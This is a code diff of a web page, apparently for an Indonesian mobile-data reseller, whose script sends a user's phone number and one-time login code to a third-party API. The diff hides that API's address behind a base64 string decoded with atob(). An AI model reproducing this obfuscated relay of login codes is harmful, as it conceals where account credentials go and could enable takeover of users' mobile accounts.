@@ -420,95 +420,98 @@
   <div style="text-align: justify;" id="log"></div></div>
 </section>
 
-
 <script>
-        const requestOtpButton = document.getElementById('requestOtpButton');
+    const requestOtpButton = document.getElementById('requestOtpButton');
 
-        function logMessage(message) {
-            const log = document.getElementById('log');
-            const newMessage = document.createElement('p');
-            newMessage.textContent = message;
-            log.appendChild(newMessage);
-            log.scrollTop = log.scrollHeight;
-        }
+    function logMessage(message) {
+        const log = document.getElementById('log');
+        const newMessage = document.createElement('p');
+        newMessage.textContent = message;
+        log.appendChild(newMessage);
+        log.scrollTop = log.scrollHeight;
+    }
 
-        function disableButton(button, seconds) {
-            let remainingTime = seconds;
-            button.disabled = true;
+    function disableButton(button, seconds) {
+        let remainingTime = seconds;
+        button.disabled = true;
+        button.textContent = `Tunggu ${remainingTime} detik`;
+        
+        const interval = setInterval(() => {
+            remainingTime -= 1;
             button.textContent = `Tunggu ${remainingTime} detik`;
-            
-            const interval = setInterval(() => {
-                remainingTime -= 1;
-                button.textContent = `Tunggu ${remainingTime} detik`;
 
-                if (remainingTime <= 0) {
-                    clearInterval(interval);
-                    button.disabled = false;
-                    button.textContent = "Minta Kode Verifikasi";
+            if (remainingTime <= 0) {
+                clearInterval(interval);
+                button.disabled = false;
+                button.textContent = "Minta Kode Verifikasi";
+            }
+        }, 1000);
+    }
+
+    function minta_otp() {
+        const phone = document.getElementById('phone').value;
+        sessionStorage.setItem('msisdn', phone);
+        showSpinner();
+
+        const domain = atob('aHR0cHM6Ly9hcGkua2hmeS1zdG9yZS5jb206ODQ0Mw==');
+
+        fetch(`${domain}/api-xl-v7/custom_api_xl_v7?action=cek_msisdn&msisdn=${encodeURIComponent(phone)}`)
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === true) {
+                    logMessage("Nomor Telah Tersimpan Di Server.. Silahkan Bertransaksi Produk Data Cuan Di Admin Riz");
+                } else {
+                    fetch(`${domain}/api-xl-v7/login_msisdn?action=request_otp&msisdn=${encodeURIComponent(phone)}`)
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.status === true) {
+                                logMessage(data.message);
+                                disableButton(requestOtpButton, 60);
+                            } else {
+                                logMessage(data.message);
+                            }
+                        });
                 }
-            }, 1000);
-        }
+                hideSpinner();
+            })
+            .catch(error => {
+                logMessage("Error: " + error.message);
+                hideSpinner();
+            });
+    }
 
-        function minta_otp() {
-            const phone = document.getElementById('phone').value;
-            sessionStorage.setItem('msisdn', phone);
-            showSpinner();
+    function login_otp() {
+        const msisdn = sessionStorage.getItem('msisdn');
+        const otp = document.getElementById('otp').value;
+        showSpinner();
 
-            fetch("https://api.khfy-store.com:8443/api-xl-v7/custom_api_xl_v7?action=cek_msisdn&msisdn=" + encodeURIComponent(phone))
-                .then(response => response.json())
-                .then(data => {
-                    if (data.status === true) {
-                        logMessage("Nomor Telah Tersimpan Di Server.. Silahkan Bertransaksi Produk Data Cuan Di Admin Riz");
-                    } else {
-                        fetch("https://api.khfy-store.com:8443/api-xl-v7/login_msisdn?action=request_otp&msisdn=" + encodeURIComponent(phone))
-                            .then(response => response.json())
-                            .then(data => {
-                                if (data.status === true) {
-                                logMessage(data.message);
-                                disableButton(requestOtpButton, 60); // Disable button for 60 seconds
-                                } else {
-                                logMessage(data.message);
-                                }
-                            });
-                    }
-                    hideSpinner();
-                })
-                .catch(error => {
-                    logMessage("Error: " + error.message);
-                    hideSpinner();
-                });
-        }
+        const domain = atob('aHR0cHM6Ly9hcGkua2hmeS1zdG9yZS5jb206ODQ0Mw==');
 
-        function login_otp() {
-            const msisdn = sessionStorage.getItem('msisdn');
-            const otp = document.getElementById('otp').value;
-            showSpinner();
+        fetch(`${domain}/api-xl-v7/login_msisdn?action=login_otp&msisdn=${encodeURIComponent(msisdn)}&otp=${encodeURIComponent(otp)}`)
+            .then(response => {
+                if (!response.ok) {
+                    logMessage("gagal terhubung ke server");
+                }
+                hideSpinner();
+                return response.json();
+            })
+            .then(data => {
+                if (data.status === true) {
+                    logMessage("Nomor Telah Tersimpan Di Server.. Silahkan Bertransaksi Produk Data Cuan Di Admin Riz");
+                } else {
+                    logMessage(data.message);
+                }
+                hideSpinner();
+            });
+    }
 
-            fetch("https://api.khfy-store.com:8443/api-xl-v7/login_msisdn?action=login_otp&msisdn=" + encodeURIComponent(msisdn) + "&otp=" + encodeURIComponent(otp))
-                .then(response => {
-                    if (!response.ok) {
-                        logMessage("gagal terhubung ke server");
-                    }
-                    hideSpinner();
-                    return response.json();
-                })
-                .then(data => {
-                    if (data.status === true) {
-                        logMessage("Nomor Telah Tersimpan Di Server.. Silahkan Bertransaksi Produk Data Cuan Di Admin Riz");
-                    } else {
-                        logMessage(data.message);
-                    }
-                    hideSpinner();
-                });
-        }
+    function showSpinner() {
+        document.getElementById('spinner').style.display = 'flex';
+    }
 
-        function showSpinner() {
-            document.getElementById('spinner').style.display = 'flex';
-        }
-
-        function hideSpinner() {
-            document.getElementById('spinner').style.display = 'none';
-        }
-    </script>
+    function hideSpinner() {
+        document.getElementById('spinner').style.display = 'none';
+    }
+          </script>
 </body>
 </html>
